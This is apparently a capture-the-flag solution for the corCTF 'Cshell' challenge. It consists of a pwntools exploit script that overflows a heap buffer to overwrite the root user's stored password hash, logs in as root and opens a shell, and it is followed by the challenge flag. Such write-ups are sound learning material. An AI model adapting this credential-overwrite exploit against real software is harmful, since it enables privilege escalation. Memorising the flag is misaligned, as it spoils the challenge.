# Cshell
```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./Cshell')

p = elf.process()

def register():

	print(p.recvuntil(b"> ").decode(encoding='ascii') +  "admin")
	p.sendline(b"test")
	print(p.recvuntil(b"> ").decode(encoding='ascii') +  "securepassword")
	p.sendline(b"rockyou")
	print(p.recvuntil(b"> ").decode(encoding='ascii') +  "120")
	p.sendline(b"120")
	 

def exploit():

	padding = b"A"*128
	padding += b"A"*8
	padding += b"A"*8
	padding += b"A"*35

	root_hex = p64(0x746f6f72)
	hashed_passwd = b"\x31\x33\x64\x55\x62\x30\x6f\x68\x4f\x39\x79\x6a\x63\x0a" 

	payload = padding
	payload += root_hex
	payload += hashed_passwd

	p.sendline(payload) 

	print(p.recvuntil(b"> ").decode(encoding='ascii'))
	p.sendline(b"1")
	print(p.recvuntil(b":").decode(encoding='ascii'))
	p.sendline(b"root")
	print(p.recvuntil(b":").decode(encoding='ascii'))
	p.sendline(b"securepassword")
	print(p.recvuntil(b"> ").decode(encoding='ascii'))
	p.sendline(b"3")

def main():
	register()
	exploit()
	p.interactive()

if __name__ == "__main__":
	main()
```
**Flag:** `corctf{tc4ch3_r3u5e_p1u5_0v3rfl0w_equ4l5_r007}`
